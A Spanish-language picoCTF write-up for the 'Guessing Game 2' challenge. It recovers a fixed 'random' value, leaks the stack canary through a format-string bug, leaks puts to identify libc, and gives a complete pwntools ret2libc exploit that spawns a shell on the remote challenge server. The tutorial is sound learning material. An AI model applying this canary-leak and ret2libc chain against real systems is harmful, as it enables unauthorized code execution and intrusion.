# Guessing Game 2

En este ejercicio nos dan un binario y su código fuente.

```c
pwndbg> checksec
File:     /home/ub1cu0/Desktop/picoCTF/guessing_game_2/vuln
Arch:     i386
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
pwndbg> 
```

```c
./vuln
Welcome to my guessing game!
Version: 2

What number would you like to guess?
3
Nope!

What number would you like to guess?
6
Nope!

What number would you like to guess?
```

Si ejecutamos el binario podemos ver que parece que estamos en un bucle en donde nos pide adivinar un numero. Vamos a verlo en el código:

```c
int main(int argc, char **argv){
. . . 
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}	
	return 0;
}
```

```c
int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}
```

```c
long get_random() {
	return rand;
}
```

Como podemos ver hay una función que compara el input a un numero pseudoaleatorio y, si es el mismo nos mandan a la función `win()`. En este caso la función `win()` ni imprime la flag si no que tiene otra parte del programa. Antes de meternos en como funciona esa función vamos a intentar llegar a ella.

En vez de generar un número aleatorio con `rand()`, el código devuelve la dirección de la función `rand` al escribir simplemente `return rand;`, sin paréntesis. Esto no ejecuta la función, sino que devuelve un puntero a ella.

Como el binario está compilado sin PIE, la dirección del stub de rand en la PLT (Procedure Linkage Table) queda hardcodeada en el binario en tiempo de compilación. Aunque rand está en la libc y el ASLR esté activado, en este caso no se está accediendo a la libc directamente, sino a esa dirección fija del PLT. Por eso, la dirección que se devuelve es constante entre ejecuciones, incluso con ASLR activado.

En resumen, no se genera un número aleatorio, y el valor final es siempre el mismo porque se calcula con una dirección fija que no cambia entre ejecuciones. Entonces podemos hacer fuerzabruta una vez y guardarnos el resultado haciendo un script como este:

```python
io = conn()
io.recvlines(4)
for i in range(-4097, 4097): # Como se hace la modular de 4046 este es el rango de valores posibles
    io.sendline(str(i))
    response = io.recvline()
    io.recvlines(2)
    if b"Congrats" in response:
        print(f"Correcto: {i}")
        break
```

Con esto tendremos el número, en este caso el mío es el `-3727` en remoto.

```c
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-3727
Congrats! You win! Your prize is this print statement!

New winner!
Name? 
```

Ahora que el codigo nos redirige a la función `win()` vamos a verla mas de cerca:

```c
void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner); // Buffer Overflow
	printf("Congrats: ");
	printf(winner); // Format Strings Vuln
	printf("\n\n");
}
```

Como podemos ver esta función tiene bastantes fallos, tenemos un buffer overflow y una vulnerabilidad de format strings. Con esto podemos intentar sobrescribir la dirección de retorno y así poder mandar el flujo del programa a donde deseemos. Pero hay un problema, en el `checksec` inicial hemos visto que tenemos la protección del Canary activada y si intentamos encontrar el offset a la dirección de retorno sobrescribiremos también el canary y nos saldrá el siguiente mensaje:

```c
*** stack smashing detected ***: <unknown> terminated
```

Como podemos saber que valor tiene el canary? Al tener una vulnerabilidad de format string podemos intentar filtrar el contenido del canary. Un canary siempre empezará en 00 (en little-endian) ya que si una función como `strcpy` o `gets` se utiliza deben saber si están a punto de tocar un `canary` y estas funciones están hechas para que al detectar un byte nulo se detengan y no toquen nada que no deben.

Si hacemos un fuzzing del stack podremos ver algunos valores que acaban por 00:

```c
. . .
35: b'Congrats: 0x4b0000\n'
. . .
54: b'Congrats: 0x32f9ad87\n'
. . .
171: b'Congrats: 0x85da4700\n'
```

Como sabemos cual es el verdadero? Si hacemos por ejemplo un leak del elemento 171 y usamos el comando canary de `pwndbg` podremos ver si coinciden:

```c
pwndbg> canary
. . .
00:0000│-4dc 0xffffc99c ◂— 0x9bfb4e00

. . .

New winner!
Name? %171$p
Congrats: 0x9bfb4e00
```

Efectivamente! en local el elemento `171` del stack es el canary. Esto no quiere decir que en remoto sea igual, en mi caso fui probando manualmente intentando ver si estaba cerca comparado al local y estuve un rato largo intentándolo. Debería haber hecho el leak en remoto pero bueno, de todo se aprende. En remoto me ha dado que es el elemento `135`.

Ahora que sabemos el valor del canary podemos sacar el offset hasta el mirando el código y comprobar si funciona el canary:

```c
#define BUFSIZE 512
. . .
void win() {
	char winner[BUFSIZE]; 
```

En el stack frame solo si guarda esa variable de 512 bytes así que ese será el offset hasta el canary. Por ahora tenemos lo siguiente?

```python
payload = b'A' * offset_canary + p32(canary)
```

Para saber cuanto hay del canary a la dirección de retorno podemos hacer un cyclic y , descubrimos que hay 12 bytes entre el canary y la dirección de retorno.

```python
payload = b'A' * offset_canary + p32(canary) + b'A' * 12 (DIRECCION DE RETORNO)
```

Ahora que ya tenemos el control sobre la dirección de retorno tenemos que mirar a donde queremos mandarl el flujo. En este caso no hay ninguna función que imprima la flag, ni tampoco he visto gadgets interesantes para hacer un ROP. En este caso podríamos intentar hacer un ret2libc y hacer un `system(/bin/bash)`. El problema es que no tenemos la `libc` y con lo cual no tenemos su versión con lo cual no sabemos donde están las funciones como `system`.

Para esto podemos intentar hacer un leak de una función de la libc y buscar en que versión de libc hay ese offset para esa función.

Podemos hacer un leak por ejemplo de `puts` con `puts` para sacar nuestra dirección de la siguiente manera:

```c
payload = b'A' * offset_canary + p32(canary) + b'A' * 12 + p32(exe.plt['puts']) + p32(exe.symbols.win) + p32(exe.got['puts'])
```

Esto nos imprimirá una dirección de memoria que podemos introducirla en una pagina como `libc.rip` y sacar la versión de la libc:

```c
puts address: 0xf7e3c560
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Podemos ver que nos da unas librerías de las versión 2.27.

Ahora que tenemos la librería podemos descargarla y indicarle a nuestro script que esa va a ser la libc que vamos a utilizar de la siguiente manera:

```python
libc = ELF("./libc6-i386_2.27-3ubuntu1.6_amd64.so")
```

Ahora, ya sabemos los offsets a cada función pero no sabemos cual es la dirección base de la libc para poder llamar a las funciones como system. Para eso tenemos que hacer un leak de una función y restarle el offset que conocemos. Si nos damos cuenta ya hemos hecho un leak de puts así que podemos aprovecharlo y usarlo para calcularlo:

```python
libc.address = puts_addr - 0x67560
```

De donde sale esa dirección? esa dirección es el offset que tiene puts en la libc que descargamos y aparece si le damos click en la página:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Entonces si le quitamos el offset de puts a la dirección de puts que filtramos tendremos la dirección base de la libc.

Podríamos también decirle a pwntools que nos saque el offset de la siguiente manera:

```c
libc.address = puts_addr - libc.symbols['puts']
```

Aquí si pwntools no sabe cual es la dirección de la libc nos saca el offset y una vez lo sepa nos saca la dirección real.

Ahora que ya tenemos la base del binario y la libc que hay en remoto ya podemos llamar a lo que queramos así que podemos pasar a hacer el script completo:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln")
libc = ELF("./libc6-i386_2.27-3ubuntu1.6_amd64.so")

context.binary = exe
context.terminal = ['kitty']

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("jupiter.challenges.picoctf.org", 18263)

offset_canary = 512

def main():
    io = conn()
    io.recvlines(4)

    # Bruteforce original para encontrar el número correcto:
    # for i in range(-4097, 4097):
    #     io.sendline(str(i))
    #     response = io.recvline()
    #     io.recvlines(2)
    #     if b"Congrats" in response:
    #         print(f"Correcto: {i}")
    #         break

    i = -3727
    io.sendline(str(i))
    io.sendlineafter(b'Name?', b'%135$p')
    canary = int(io.recvline().decode().strip().split(": ")[1], 16)
    log.success(f'Canary: {hex(canary)}')

    io.recvlines(2)
    io.sendline(str(i))
    io.recvlines(2)

    payload = (
        b'A' * offset_canary +
        p32(canary) +
        b'A' * 12 +
        p32(exe.plt['puts']) +
        p32(exe.symbols.win) +
        p32(exe.got['puts'])
    )

    io.sendlineafter(b'Name?', payload)
    io.recvlines(2)
    puts_addr = u32(io.recvline()[:4])
    log.success(f'puts address: {hex(puts_addr)}')

    libc.address = puts_addr - libc.symbols['puts']
    binsh_addr = next(libc.search(b'/bin/sh'))

    payload2 = (
        b'B' * offset_canary +
        p32(canary) +
        b'B' * 12 +
        p32(libc.symbols['system']) +
        p32(exe.symbols.win) +
        p32(binsh_addr)
    )

    io.sendlineafter(b'Name?', payload2)
    io.interactive()

if __name__ == "__main__":
    main()

```

Y listo! Tendríamos una shell!

```python
$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$  
```

Gracias por leer!
